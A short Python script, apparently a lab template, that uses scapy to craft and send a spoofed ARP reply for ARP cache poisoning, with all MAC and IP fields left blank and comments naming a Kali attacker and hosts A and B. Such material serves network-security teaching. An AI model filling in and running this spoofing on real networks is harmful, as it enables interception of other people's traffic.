#!/usr/bin/env/python3

from scapy.all import *

#We set ARP options to bind B's mac to M's IP
#HW src = kali's mac
#psrc= B's IP
#hwdst = A's MAC
#pdst = A's IP

E = Ether()
E.src = ""
E.dst = ""

A = ARP()
A.op = 2
A.hwsrc = ""
A.psrc  = ""
A.hwdst = ""
A.pdst  = ""

print("Sending the following packet\n")
p = E/A
p.show()
sendp(p)

